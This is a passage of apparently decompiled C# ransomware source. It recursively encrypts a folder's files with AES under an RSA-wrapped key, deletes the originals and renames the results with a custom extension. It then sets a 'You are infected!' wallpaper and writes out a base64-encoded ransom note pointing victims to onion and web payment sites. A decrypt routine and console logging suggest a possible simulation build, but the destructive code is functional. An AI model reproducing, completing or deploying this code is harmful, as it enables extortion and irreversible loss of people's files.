		byte[] array2 = new byte[4];
		byte[] array3 = new byte[4];
		int num = array.Length;
		array2 = BitConverter.GetBytes(num);
		int num2 = aes.IV.Length;
		array3 = BitConverter.GetBytes(num2);
		inFile.LastIndexOf("\\");
		using (FileStream fileStream = new FileStream(inFile + ".4agrfsh5tx7", FileMode.Create))
		{
			fileStream.Write(array2, 0, 4);
			fileStream.Write(array3, 0, 4);
			fileStream.Write(array, 0, num);
			fileStream.Write(aes.IV, 0, num2);
			using (CryptoStream cryptoStream = new CryptoStream(fileStream, transform, CryptoStreamMode.Write))
			{
				int num3 = 0;
				int num4 = 0;
				int num5 = aes.BlockSize / 8;
				byte[] buffer = new byte[num5];
				int num6 = 0;
				using (FileStream fileStream2 = new FileStream(inFile, FileMode.Open))
				{
					do
					{
						num3 = fileStream2.Read(buffer, 0, num5);
						num4 += num3;
						cryptoStream.Write(buffer, 0, num3);
						num6 += num5;
					}
					while (num3 > 0);
					fileStream2.Close();
				}
				cryptoStream.FlushFinalBlock();
				cryptoStream.Close();
			}
			fileStream.Close();
		}
		File.Delete(inFile);
	}

	private void DecryptFile(string inFile)
	{
		Aes aes = Aes.Create();
		byte[] array = new byte[4];
		byte[] array2 = new byte[4];
		string path = inFile.Substring(0, inFile.LastIndexOf("."));
		using (FileStream fileStream = new FileStream(inFile, FileMode.Open))
		{
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Read(array, 0, 3);
			fileStream.Seek(4L, SeekOrigin.Begin);
			fileStream.Read(array2, 0, 3);
			int num = BitConverter.ToInt32(array, 0);
			int num2 = BitConverter.ToInt32(array2, 0);
			int num3 = num + num2 + 8;
			_ = fileStream.Length;
			byte[] array3 = new byte[num];
			byte[] array4 = new byte[num2];
			fileStream.Seek(8L, SeekOrigin.Begin);
			fileStream.Read(array3, 0, num);
			fileStream.Seek(8 + num, SeekOrigin.Begin);
			fileStream.Read(array4, 0, num2);
			Directory.CreateDirectory(SrcFolder);
			byte[] rgbKey = rsa.Decrypt(array3, fOAEP: false);
			ICryptoTransform transform = aes.CreateDecryptor(rgbKey, array4);
			using (FileStream fileStream2 = new FileStream(path, FileMode.Create))
			{
				int num4 = 0;
				int num5 = 0;
				int num6 = aes.BlockSize / 8;
				byte[] buffer = new byte[num6];
				fileStream.Seek(num3, SeekOrigin.Begin);
				using (CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write))
				{
					do
					{
						num4 = fileStream.Read(buffer, 0, num6);
						num5 += num4;
						cryptoStream.Write(buffer, 0, num4);
					}
					while (num4 > 0);
					cryptoStream.FlushFinalBlock();
					cryptoStream.Close();
				}
				fileStream2.Close();
			}
			fileStream.Close();
		}
		File.Delete(inFile);
	}

	public void EncryptDirectory(string targetDirectory)
	{
		try
		{
			string[] files = Directory.GetFiles(targetDirectory);
			foreach (string text in files)
			{
				EncryptFile(text);
				Console.WriteLine("Encrypted file '{0}'.", text);
			}
			files = Directory.GetDirectories(targetDirectory);
			foreach (string targetDirectory2 in files)
			{
				EncryptDirectory(targetDirectory2);
			}
		}
		catch (Exception)
		{
			Console.WriteLine("Can't access folder");
		}
	}

	public void DecryptDirectory(string targetDirectory)
	{
		FileInfo[] files = new DirectoryInfo(targetDirectory).GetFiles("*.4agrfsh5tx7");
		foreach (FileInfo fileInfo in files)
		{
			DecryptFile(fileInfo.FullName);
			Console.WriteLine("Decrypted file '{0}'.", fileInfo.FullName);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		foreach (string targetDirectory2 in directories)
		{
			DecryptDirectory(targetDirectory2);
		}
	}

	public void Encrypt()
	{
		if (Directory.Exists(SrcFolder))
		{
			GetPrivateKey();
			EncryptDirectory(SrcFolder);
		}
		else
		{
			Console.WriteLine("{0} is not a valid file or directory.", SrcFolder);
		}
	}

	public void Decrypt()
	{
		if (Directory.Exists(SrcFolder))
		{
			GetPrivateKey();
			DecryptDirectory(SrcFolder);
		}
		else
		{
			Console.WriteLine("{0} is not a valid file or directory.", SrcFolder);
		}
	}

	public void SetBackgroundImage()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		string text = "You are infected! Read " + ransomFileName;
		int width = 1280;
		int height = 720;
		Bitmap val = new Bitmap(1280, 720);
		PointF pointF = new PointF(490f, 20f);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Font val3 = new Font("Arial", 10f);
			try
			{
				val2.FillRectangle(Brushes.get_DarkBlue(), new Rectangle(0, 0, width, height));
				val2.DrawString(text, val3, Brushes.get_White(), pointF);
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			((Image)val).Save(imgDestPath, ImageFormat.get_Bmp());
			((Image)val).Dispose();
			Wallpaper.SetWallpaper(imgDestPath, Wallpaper.Style.Centered);
			Console.WriteLine("Replaced custom wallpaper");
		}
		catch (Exception)
		{
			Console.WriteLine("Error manipulating image");
		}
	}

	public void DropRansomNote()
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		byte[] bytes = Convert.FromBase64String("LS0tPT09IFdlbGNvbWUuIEFnYWluLiA9PT0tLS0NCg0KWytdIFdoYXRzIEhhcHBlbj8gWytdDQoNCllvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCwgYW5kIGN1cnJlbnRseSB1bmF2YWlsYWJsZS4gWW91IGNhbiBjaGVjayBpdDogYWxsIGZpbGVzIG9uIHlvdSBjb21wdXRlciBoYXMgZXhwYW5zaW9uIHtFWFR9Lg0KQnkgdGhlIHdheSwgZXZlcnl0aGluZyBpcyBwb3NzaWJsZSB0byByZWNvdmVyIChyZXN0b3JlKSwgYnV0IHlvdSBuZWVkIHRvIGZvbGxvdyBvdXIgaW5zdHJ1Y3Rpb25zLiBPdGhlcndpc2UsIHlvdSBjYW50IHJldHVybiB5b3VyIGRhdGEgKE5FVkVSKS4NCg0KWytdIFdoYXQgZ3VhcmFudGVlcz8gWytdDQoNCkl0cyBqdXN0IGEgYnVzaW5lc3MuIFdlIGFic29sdXRlbHkgZG8gbm90IGNhcmUgYWJvdXQgeW91IGFuZCB5b3VyIGRlYWxzLCBleGNlcHQgZ2V0dGluZyBiZW5lZml0cy4gSWYgd2UgZG8gbm90IGRvIG91ciB3b3JrIGFuZCBsaWFiaWxpdGllcyAtIG5vYm9keSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCB1cy4gSXRzIG5vdCBpbiBvdXIgaW50ZXJlc3RzLg0KVG8gY2hlY2sgdGhlIGFiaWxpdHkgb2YgcmV0dXJuaW5nIGZpbGVzLCBZb3Ugc2hvdWxkIGdvIHRvIG91ciB3ZWJzaXRlLiBUaGVyZSB5b3UgY2FuIGRlY3J5cHQgb25lIGZpbGUgZm9yIGZyZWUuIFRoYXQgaXMgb3VyIGd1YXJhbnRlZS4NCklmIHlvdSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCBvdXIgc2VydmljZSAtIGZvciB1cywgaXRzIGRvZXMgbm90IG1hdHRlci4gQnV0IHlvdSB3aWxsIGxvc2UgeW91ciB0aW1lIGFuZCBkYXRhLCBjYXVzZSBqdXN0IHdlIGhhdmUgdGhlIHByaXZhdGUga2V5LiBJbiBwcmFjdGlzZSAtIHRpbWUgaXMgbXVjaCBtb3JlIHZhbHVhYmxlIHRoYW4gbW9uZXkuDQoNClsrXSBIb3cgdG8gZ2V0IGFjY2VzcyBvbiB3ZWJzaXRlPyBbK10NCg0KWW91IGhhdmUgdHdvIHdheXM6DQoNCjEpIFtSZWNvbW1lbmRlZF0gVXNpbmcgYSBUT1IgYnJvd3NlciENCiAgYSkgRG93bmxvYWQgYW5kIGluc3RhbGwgVE9SIGJyb3dzZXIgZnJvbSB0aGlzIHNpdGU6IGh0dHBzOi8vdG9ycHJvamVjdC5vcmcvDQogIGIpIE9wZW4gb3VyIHdlYnNpdGU6IGh0dHA6Ly93d3lsZ2N2ZWdwMzN0Mnl0bnNxYTZrbHJvcTNrejY0M3E1Y2VpbmtxYjd4NjIzMmczZ3VpdDJpZC5vbmlvbg0KDQoyKSBJZiBUT1IgYmxvY2tlZCBpbiB5b3VyIGNvdW50cnksIHRyeSB0byB1c2UgVlBOISBCdXQgeW91IGNhbiB1c2Ugb3VyIHNlY29uZGFyeSB3ZWJzaXRlLiBGb3IgdGhpczoNCiAgYSkgT3BlbiB5b3VyIGFueSBicm93c2VyIChDaHJvbWUsIEZpcmVmb3gsIE9wZXJhLCBJRSwgRWRnZSkNCiAgYikgT3BlbiBvdXIgc2Vjb25kYXJ5IHdlYnNpdGU6IGh0dHA6Ly9kZWNyeXB0b3IudG9wLzkxM0FFRDBCNUZFMTQ5N0QNCg0KV2FybmluZzogc2Vjb25kYXJ5IHdlYnNpdGUgY2FuIGJlIGJsb2NrZWQsIHRoYXRzIHdoeSBmaXJzdCB2YXJpYW50IG11Y2ggYmV0dGVyIGFuZCBtb3JlIGF2YWlsYWJsZS4NCg0KV2hlbiB5b3Ugb3BlbiBvdXIgd2Vic2l0ZSwgcHV0IHRoZSBmb2xsb3dpbmcgZGF0YSBpbiB0aGUgaW5wdXQgZm9ybToNCktleToNCg0Ke0tFWX0NCg0KRXh0ZW5zaW9uIG5hbWU6DQoNCntFWFR9DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiEhISBEQU5HRVIgISEhDQpET05UIHRyeSB0byBjaGFuZ2UgZmlsZXMgYnkgeW91cnNlbGYsIERPTlQgdXNlIGFueSB0aGlyZCBwYXJ0eSBzb2Z0d2FyZSBmb3IgcmVzdG9yaW5nIHlvdXIgZGF0YSBvciBhbnRpdmlydXMgc29sdXRpb25zIC0gaXRzIG1heSBlbnRhaWwgZGFtZ2Ugb2YgdGhlIHByaXZhdGUga2V5IGFuZCwgYXMgcmVzdWx0LCBUaGUgTG9zcyBhbGwgZGF0YS4NCiEhISAhISEgISEhDQpPTkUgTU9SRSBUSU1FOiBJdHMgaW4geW91ciBpbnRlcmVzdHMgdG8gZ2V0IHlvdXIgZmlsZXMgYmFjay4gRnJvbSBvdXIgc2lkZSwgd2UgKHRoZSBiZXN0IHNwZWNpYWxpc3RzKSBtYWtlIGV2ZXJ5dGhpbmcgZm9yIHJlc3RvcmluZywgYnV0IHBsZWFzZSBzaG91bGQgbm90IGludGVyZmVyZS4NCiEhISAhISEgISEh");
		string @string = Encoding.UTF8.GetString(bytes);
		@string = @string.Replace("{EXT}", "4agrfsh5tx7");
		Random random = new Random();
		char[] array = new char[1250];
		for (int i = 0; i < array.Length; i++)
		{
			if (i % 64 == 0)
			{
				array[i] = '\n';
			}
			else
			{
				array[i] = text[random.Next(text.Length)];
			}
		}
		string newValue = new string(array);
		@string = @string.Replace("{KEY}", newValue);
		using (StreamWriter streamWriter = new StreamWriter(ransomNoteDropPath))
		{
			streamWriter.WriteLine(@string);
		}
		Console.WriteLine("Ransom note dropped");
	}
}
